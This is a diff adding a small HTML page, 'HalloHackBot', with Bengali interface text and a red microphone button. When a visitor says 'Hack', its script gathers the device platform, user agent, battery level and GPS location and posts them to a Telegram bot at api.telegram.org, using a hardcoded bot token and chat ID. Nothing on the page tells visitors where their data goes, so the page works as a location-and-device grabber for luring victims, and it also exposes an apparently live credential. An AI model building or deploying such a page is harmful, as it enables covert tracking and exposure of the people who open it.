@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HalloHackBot</title>
+    <style>
+        body { background: #000; color: #ff0000; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Courier New', Courier, monospace; }
+        #micBtn {
+            width: 150px; height: 150px; border-radius: 50%;
+            background: #ff0000; border: 8px solid #330000; color: white;
+            font-size: 50px; cursor: pointer; box-shadow: 0 0 20px rgba(255,0,0,0.5);
+            transition: transform 0.2s;
+        }
+        #micBtn:active { transform: scale(0.9); }
+        #status { margin-top: 20px; font-weight: bold; text-align: center; font-size: 18px; color: #00ff00; }
+    </style>
+</head>
+<body>
+
+    <button id="micBtn">🔴</button>
+    <div id="status">বাটন ক্লিক করে Hack বলুন!</div>
+
+<script>
+    const micBtn = document.getElementById('micBtn');
+    const statusText = document.getElementById('status');
+
+    // এখানে আপনার আসল টোকেন এবং আইডি বসান
+    const TG_TOKEN = "8246292804:AAHLhf-Q8W9Go1HpHEFh6ArzYO7IRrFbScQ"; 
+    const CHAT_ID = "7807462100";
+
+    async function startExtraction() {
+        statusText.innerText = "ডাটা সংগ্রহ করা হচ্ছে...";
+        
+        let report = {
+            time: new Date().toLocaleString(),
+            device: navigator.platform,
+            ua: navigator.userAgent,
+            battery: "N/A",
+            loc: "অনুমতি দেওয়া হয়নি"
+        };
+
+        // ব্যাটারি তথ্য সংগ্রহ
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                report.battery = `${(b.level * 100).toFixed(0)}%`;
+            }
+        } catch(e) {}
+
+        // লোকেশন তথ্য সংগ্রহ
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                report.loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await sendToTelegram(report);
+            }, async (err) => {
+                await sendToTelegram(report); 
+            }, {timeout: 5000});
+        } else {
+            await sendToTelegram(report);
+        }
+    }
+
+    async function sendToTelegram(data) {
+        const text = `🚨 *NEW DEVICE REPORT* 🚨\n\n` +
+                     `📅 *Time:* ${data.time}\n` +
+                     `💻 *Device:* ${data.device}\n` +
+                     `🔋 *Battery:* ${data.battery}\n` +
+                     `📍 *Location:* ${data.loc}\n\n` +
+                     `🌐 *UA:* \`${data.ua.substring(0, 100)}...\``;
+
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: text, 
+                    parse_mode: "Markdown" 
+                })
+            });
+            if(res.ok) {
+                statusText.innerHTML = "✅ রিপোর্ট পাঠানো হয়েছে!";
+            } else {
+                statusText.innerText = "ভুল টোকেন বা আইডি!";
+            }
+        } catch (e) {
+            statusText.innerText = "কানেকশন এরর!";
+        }
+    }
+
+    // ভয়েস কমান্ড কন্ট্রোল
+    const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+    if (SpeechRecognition) {
+        const recognition = new SpeechRecognition();
+        recognition.lang = 'en-US';
+
+        micBtn.onclick = () => {
+            recognition.start();
+            statusText.innerText = "শুনছি... 'Hack' শব্দটি বলুন";
+        };
+
+        recognition.onresult = (e) => {
+            const cmd = e.results[0][0].transcript.toLowerCase();
+            if (cmd.includes('hack')) {
+                startExtraction();
+            } else {
+                statusText.innerText = "আবার চেষ্টা করুন...";
+            }
+        };
+    } else {
+        micBtn.onclick = startExtraction;
+    }
+</script>
+</body>
+</html>
